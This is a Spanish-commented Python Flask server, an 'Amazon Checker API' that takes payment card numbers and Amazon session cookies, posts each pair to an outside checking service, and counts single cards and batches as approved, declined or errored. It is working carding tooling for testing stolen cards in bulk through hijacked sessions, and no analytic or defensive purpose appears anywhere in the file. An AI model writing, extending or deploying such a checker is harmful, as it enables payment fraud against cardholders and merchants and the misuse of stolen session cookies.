from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import time
import os

app = Flask(__name__)

# Configuración para producción - PERMITE tu dominio de Hostinger
CORS(app, origins=[
    "https://ciber7erroristaschk.com/",  
    "http://localhost:3000",
    "http://127.0.0.1:3000"
])

class AmazonChecker:
    def __init__(self):
        self.api_url = "https://leviatan-chk.site/amazon/leviatan"
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    
    def check_single_card(self, card: str, cookies: str) -> dict:
        data = {
            "card": card,
            "cookies": cookies
        }
        
        try:
            response = requests.post(
                self.api_url, 
                json=data, 
                headers=self.headers,
                timeout=30
            )
            result = response.json()
            return {
                "success": True,
                "status": result.get("status", "⚠️ Error"),
                "message": result.get("message", "Sin mensaje"),
                "raw_response": result
            }
        except Exception as e:
            return {
                "success": False,
                "status": "⚠️ Error",
                "message": f"Error de conexión: {str(e)}",
                "raw_response": None
            }

checker = AmazonChecker()

@app.route('/')
def home():
    return jsonify({
        "message": "✅ Amazon Checker API - Leviatan",
        "status": "active",
        "endpoints": {
            "health": "/api/health",
            "check_card": "/api/check-card",
            "check_multiple": "/api/check-multiple-cards"
        }
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "✅ Servidor funcionando en Northflank",
        "timestamp": time.time()
    })

@app.route('/api/check-card', methods=['POST'])
def check_card():
    try:
        data = request.get_json()
        
        if not data or 'card' not in data or 'cookies' not in data:
            return jsonify({
                "success": False,
                "error": "Datos incompletos. Se requieren 'card' y 'cookies'"
            }), 400
        
        card = data['card']
        cookies = data['cookies']
        
        print(f"🔍 Verificando tarjeta: {card[:16]}...")
        
        result = checker.check_single_card(card, cookies)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Error interno: {str(e)}"
        }), 500

@app.route('/api/check-multiple-cards', methods=['POST'])
def check_multiple_cards():
    try:
        data = request.get_json()
        
        if not data or 'cards' not in data or 'cookies' not in data:
            return jsonify({
                "success": False,
                "error": "Datos incompletos. Se requieren 'cards' y 'cookies'"
            }), 400
        
        cards = data['cards']
        cookies = data['cookies']
        
        if not isinstance(cards, list):
            return jsonify({
                "success": False,
                "error": "El campo 'cards' debe ser una lista"
            }), 400
        
        print(f"🔍 Verificando {len(cards)} tarjetas...")
        
        results = []
        for i, card in enumerate(cards, 1):
            print(f"Procesando tarjeta {i}/{len(cards)}...")
            
            result = checker.check_single_card(card, cookies)
            results.append({
                "card": card,
                "result": result
            })
            
            time.sleep(1)
        
        approved = sum(1 for r in results if "✅ Approved" in r["result"]["status"])
        declined = sum(1 for r in results if "❌ Declined" in r["result"]["status"])
        errors = sum(1 for r in results if "⚠️ Error" in r["result"]["status"])
        
        return jsonify({
            "success": True,
            "summary": {
                "total": len(results),
                "approved": approved,
                "declined": declined,
                "error": errors
            },
            "details": results
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": f"Error interno: {str(e)}"
        }), 500
